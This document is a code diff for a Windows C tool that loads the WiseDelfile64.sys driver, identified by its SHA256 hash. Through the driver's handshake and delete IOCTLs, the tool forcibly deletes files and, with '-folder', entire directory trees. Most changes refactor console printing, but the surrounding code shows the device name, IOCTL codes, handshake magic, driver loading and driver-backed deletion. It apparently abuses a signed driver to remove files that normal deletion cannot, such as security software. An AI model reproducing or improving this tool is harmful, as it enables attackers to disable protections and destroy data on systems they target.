@@ -4,8 +4,8 @@
 // WiseDelfile64.sys SHA256: 8c4c6cc6685a719ac4e6119e1dac4ba029eba21720d5c3ca340006c9113cc6df
 
 #define DEVICE_NAME L"\\\\.\\WiseDelfile"
-#define HANDSHAKE_IOCTL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define DELFILE_IOCTL   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x001, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define HANDSHAKE_IOCTL CTL_CODE(0x22, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define DELFILE_IOCTL   CTL_CODE(0x22, 0x001, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 #define HANDSHAKE_MAGIC 20
 #define HANDSHAKE_STRING "WiseDelfile"
@@ -83,10 +83,30 @@ wchar_t* MyWcstok(wchar_t* str, const wchar_t* delim, wchar_t** context) {
     return token;
 }
 
-void PrintW(const wchar_t* msg) {
+void PrintW(const wchar_t* format, ...) {
     HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
+    wchar_t buffer[1024];
+    int bIdx = 0;
+
+    __builtin_va_list args;
+    __builtin_va_start(args, format);
+
+    for (int i = 0; format[i] != L'\0' && bIdx < 1023; i++) {
+        if (format[i] == L'%') {
+            i++;
+            if (format[i] == L's') {
+                const wchar_t* str = __builtin_va_arg(args, const wchar_t*);
+                while (*str && bIdx < 1023) buffer[bIdx++] = *str++;
+            }
+        } else {
+            buffer[bIdx++] = format[i];
+        }
+    }
+    buffer[bIdx] = L'\0';
+    __builtin_va_end(args);
+
     DWORD written;
-    WriteConsoleW(hOut, msg, (DWORD)wcslen(msg), &written, NULL);
+    WriteConsoleW(hOut, buffer, (DWORD)bIdx, &written, NULL);
 }
 
 LPWSTR NextArg(LPWSTR* cmdLine) {
@@ -268,23 +288,15 @@ void DeleteDirectoryRecursive(HANDLE hDevice, const wchar_t* dirPath) {
             DeleteDirectoryRecursive(hDevice, fullPath);
             
             if (!RemoveDirectoryW(fullPath)) {
-                PrintW(L"[-] Failed to delete folder: ");
-                PrintW(fullPath);
-                PrintW(L"\n");
+                PrintW(L"[-] Failed to delete folder: %s\n", fullPath);
             } else {
-                PrintW(L"[+] Deleted folder: ");
-                PrintW(fullPath);
-                PrintW(L"\n");
+                PrintW(L"[+] Deleted folder: %s\n", fullPath);
             }
         } else {
             if (DriverDelete(hDevice, fullPath)) {
-                PrintW(L"[+] Deleted file: ");
-                PrintW(fullPath);
-                PrintW(L"\n");
+                PrintW(L"[+] Deleted file: %s\n", fullPath);
             } else {
-                PrintW(L"[-] Failed to delete file: ");
-                PrintW(fullPath);
-                PrintW(L"\n");
+                PrintW(L"[-] Failed to delete file: %s\n", fullPath);
             }
         }
     } while (FindNextFileW(hFind, &fd));
@@ -295,35 +307,25 @@ void DeleteDirectoryRecursive(HANDLE hDevice, const wchar_t* dirPath) {
 void ProcessTarget(HANDLE hDevice, wchar_t* targetFile, BOOL recursive) {
     DWORD targetAttrib = GetFileAttributesW(targetFile);
     if (targetAttrib == INVALID_FILE_ATTRIBUTES) {
-        PrintW(L"[-] Path not found: ");
-        PrintW(targetFile);
-        PrintW(L"\n");
+        PrintW(L"[-] Path not found: %s\n", targetFile);
         return;
     }
 
     if ((targetAttrib & FILE_ATTRIBUTE_DIRECTORY) && !recursive) {
-        PrintW(L"[-] Target is a directory. Use -folder to delete: ");
-        PrintW(targetFile);
-        PrintW(L"\n");
+        PrintW(L"[-] Target is a directory. Use -folder to delete: %s\n", targetFile);
         return;
     }
 
     if (targetAttrib & FILE_ATTRIBUTE_DIRECTORY) {
         DeleteDirectoryRecursive(hDevice, targetFile);
         if (RemoveDirectoryW(targetFile)) {
-            PrintW(L"[+] Deleted folder: ");
-            PrintW(targetFile);
-            PrintW(L"\n");
+            PrintW(L"[+] Deleted folder: %s\n", targetFile);
         }
     } else {
         if (DriverDelete(hDevice, targetFile)) {
-            PrintW(L"[+] Successfully deleted: ");
-            PrintW(targetFile);
-            PrintW(L"\n");
+            PrintW(L"[+] Successfully deleted: %s\n", targetFile);
         } else {
-            PrintW(L"[-] Failed to delete: ");
-            PrintW(targetFile);
-            PrintW(L"\n");
+            PrintW(L"[-] Failed to delete: %s\n", targetFile);
         }
     }
 }
@@ -356,9 +358,7 @@ void mainCRTStartup() {
             p++;
         }
 
-        PrintW(L"Usage: ");
-        PrintW(progName);
-        PrintW(L" <path1,path2,...> [-folder]\n");
+        PrintW(L"Usage: %s <path1,path2,...> [-folder]\n", progName);
         ExitProcess(0);
     }
 
@@ -378,8 +378,8 @@ void mainCRTStartup() {
     
     HANDLE hDevice = INVALID_HANDLE_VALUE;
     
-	BOOL driverLoaded = FALSE;
-	
+    BOOL driverLoaded = FALSE;
+    
     for (int i = 0; i < 2; i++) {
         hDevice = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
     
@@ -389,16 +389,12 @@ void mainCRTStartup() {
         if (i == 0) {
             DWORD driverAttrib = GetFileAttributesW(driverPath);
             if (driverAttrib == INVALID_FILE_ATTRIBUTES || (driverAttrib & FILE_ATTRIBUTE_DIRECTORY)) {
-                PrintW(L"[-] Driver file not found: ");
-                PrintW(driverPath);
-                PrintW(L"\n");
+                PrintW(L"[-] Driver file not found: %s\n", driverPath);
                 ExitProcess(-1);
             }
 
             if (!LoadDriver(hNtdll, serviceName, driverPath)) {
-                PrintW(L"[-] Failed to Load Driver: ");
-                PrintW(driverPath);
-                PrintW(L"\n");
+                PrintW(L"[-] Failed to Load Driver: %s\n", driverPath);
                 ExitProcess(-1);
             }
             driverLoaded = TRUE;
@@ -418,9 +414,7 @@ void mainCRTStartup() {
         
         CloseHandle(hDevice);
     } else {
-        PrintW(L"[-] Unable to obtain device handle: ");
-        PrintW(DEVICE_NAME);
-        PrintW(L"\n");
+        PrintW(L"[-] Unable to obtain device handle: %s\n", DEVICE_NAME);
     }
 
     if (driverLoaded)
